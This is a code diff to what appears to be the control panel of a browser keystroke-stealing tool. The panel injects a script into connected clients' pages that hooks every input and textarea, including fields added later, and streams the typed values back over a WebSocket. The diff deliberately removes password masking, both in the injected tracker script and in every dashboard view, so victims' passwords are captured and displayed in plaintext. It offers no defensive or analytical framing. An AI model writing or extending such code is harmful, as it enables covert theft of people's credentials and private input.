@@ -832,7 +832,7 @@ function handleKeystroke(data) {
 
     // Feed (only for significant changes, avoid spam)
     if (field.length % 5 === 0 || field.length < 3) {
-        const displayVal = field.isPassword ? '•'.repeat(field.length) : `"${field.value.substring(0,40)}${field.value.length > 40 ? '...' : ''}"`;
+        const displayVal = /*field.isPassword ? '•'.repeat(field.length) : */`"${field.value.substring(0,40)}${field.value.length > 40 ? '...' : ''}"`;
         addFeedEntry('keystroke', `#${clientId}`, `[${field.fieldId}] ${displayVal} (${field.length} chars)`);
     }
 
@@ -856,7 +856,7 @@ function updateCardKsPreview(card, clientId) {
         card.appendChild(preview);
     }
 
-    const displayVal = latest.isPassword ? '•'.repeat(latest.length) : latest.value;
+    const displayVal = /*latest.isPassword ? '•'.repeat(latest.length) : */latest.value;
     const fieldName = latest.label || latest.placeholder || latest.fieldId;
 
     preview.innerHTML = `
@@ -898,7 +898,7 @@ function updateGlobalKsEntry(clientId, fieldKey, field) {
         fieldsContainer.appendChild(fieldEl);
     }
 
-    const displayVal = field.isPassword ? '•'.repeat(field.length) : field.value;
+    const displayVal = /*field.isPassword ? '•'.repeat(field.length) : */field.value;
     const fieldName = field.label || field.placeholder || field.fieldId;
     const typeLabel = field.isPassword ? '🔑 PASSWORD' : field.fieldType;
 
@@ -971,7 +971,7 @@ function renderKeystrokeTab() {
         </div>
         <div class="ks-monitor">
             ${sorted.map(field => {
-                const displayVal = field.isPassword ? '•'.repeat(field.length) : field.value;
+                const displayVal = /*field.isPassword ? '•'.repeat(field.length) : */field.value;
                 const fieldName = field.label || field.placeholder || field.fieldId;
                 const typeClass = field.isPassword ? 'password' : (field.fieldType === 'text' || field.fieldType === 'textarea') ? 'text' : 'other';
                 return `
@@ -1042,7 +1042,7 @@ function renderClientList() {
                 ${latestKs ? `
                     <div class="client-ks-preview">
                         <div class="ks-field-name">⌨️ ${escapeHtml(latestKs.label || latestKs.placeholder || latestKs.fieldId)}</div>
-                        <div class="ks-value">${escapeHtml(latestKs.isPassword ? '•'.repeat(latestKs.length) : latestKs.value)}<span style="display:inline-block;width:2px;height:1em;background:var(--accent);animation:blink 1s infinite;vertical-align:text-bottom;margin-left:1px;"></span></div>
+                        <div class="ks-value">${escapeHtml(/*latestKs.isPassword ? '•'.repeat(latestKs.length) : */latestKs.value)}<span style="display:inline-block;width:2px;height:1em;background:var(--accent);animation:blink 1s infinite;vertical-align:text-bottom;margin-left:1px;"></span></div>
                     </div>
                 ` : ''}
             </div>
@@ -1259,7 +1259,7 @@ function fetchPageInfo(id) {
 }
 
 // Build the keystroke tracker script as a string and inject it
-const KEYSTROKE_TRACKER_SCRIPT = `(function initKeystrokeStream(){if(window.__ksTrackerInit)return;window.__ksTrackerInit=true;function getMeta(el){var id=el.id||el.name||el.placeholder||el.getAttribute('aria-label')||'unknown';var type=el.type||el.tagName.toLowerCase();var placeholder=el.placeholder||'';var label=el.getAttribute('aria-label')||(document.querySelector('label[for="'+el.id+'"]')||{}).textContent||'';var isPassword=type==='password'||id.toLowerCase().includes('password');return{id:id,type:type,placeholder:placeholder,label:label.trim?label.trim():label,isPassword:isPassword};}function sendKS(el,value){var meta=getMeta(el);window.postMessage({action:'sendToWS',message:JSON.stringify({type:'keystroke',fieldId:meta.id,fieldType:meta.type,placeholder:meta.placeholder,label:meta.label,isPassword:meta.isPassword,value:meta.isPassword?'\\u2022'.repeat(value.length):value,length:value.length,url:location.href,title:document.title,ts:Date.now()})},'*');}function attach(el){if(el._ksAttached)return;el._ksAttached=true;var h=function(){sendKS(el,el.value);};el.addEventListener('input',h);el.addEventListener('paste',function(){setTimeout(function(){sendKS(el,el.value);},50);});el._ksH=h;}function detach(el){if(el._ksH){el.removeEventListener('input',el._ksH);el.removeEventListener('paste',el._ksH);delete el._ksH;delete el._ksAttached;}}document.querySelectorAll('input,textarea').forEach(attach);new MutationObserver(function(mutations){mutations.forEach(function(m){m.addedNodes.forEach(function(n){if(n.nodeType===1){if(n.matches('input,textarea'))attach(n);n.querySelectorAll('input,textarea').forEach(attach);}});m.removedNodes.forEach(function(n){if(n.nodeType===1){if(n.matches('input,textarea'))detach(n);n.querySelectorAll('input,textarea').forEach(detach);}});});}).observe(document.body,{childList:true,subtree:true});})();`;
+const KEYSTROKE_TRACKER_SCRIPT = `(function initKeystrokeStream(){if(window.__ksTrackerInit)return;window.__ksTrackerInit=true;function getMeta(el){var id=el.id||el.name||el.placeholder||el.getAttribute('aria-label')||'unknown';var type=el.type||el.tagName.toLowerCase();var placeholder=el.placeholder||'';var label=el.getAttribute('aria-label')||(document.querySelector('label[for="'+el.id+'"]')||{}).textContent||'';var isPassword=type==='password'||id.toLowerCase().includes('password');return{id:id,type:type,placeholder:placeholder,label:label.trim?label.trim():label,isPassword:isPassword};}function sendKS(el,value){var meta=getMeta(el);window.postMessage({action:'sendToWS',message:JSON.stringify({type:'keystroke',fieldId:meta.id,fieldType:meta.type,placeholder:meta.placeholder,label:meta.label,isPassword:meta.isPassword,value:value,length:value.length,url:location.href,title:document.title,ts:Date.now()})},'*');}function attach(el){if(el._ksAttached)return;el._ksAttached=true;var h=function(){sendKS(el,el.value);};el.addEventListener('input',h);el.addEventListener('paste',function(){setTimeout(function(){sendKS(el,el.value);},50);});el._ksH=h;}function detach(el){if(el._ksH){el.removeEventListener('input',el._ksH);el.removeEventListener('paste',el._ksH);delete el._ksH;delete el._ksAttached;}}document.querySelectorAll('input,textarea').forEach(attach);new MutationObserver(function(mutations){mutations.forEach(function(m){m.addedNodes.forEach(function(n){if(n.nodeType===1){if(n.matches('input,textarea'))attach(n);n.querySelectorAll('input,textarea').forEach(attach);}});m.removedNodes.forEach(function(n){if(n.nodeType===1){if(n.matches('input,textarea'))detach(n);n.querySelectorAll('input,textarea').forEach(detach);}});});}).observe(document.body,{childList:true,subtree:true});})();`;
 
 function injectKeystrokeTracker() {
     broadcastCommand(KEYSTROKE_TRACKER_SCRIPT);
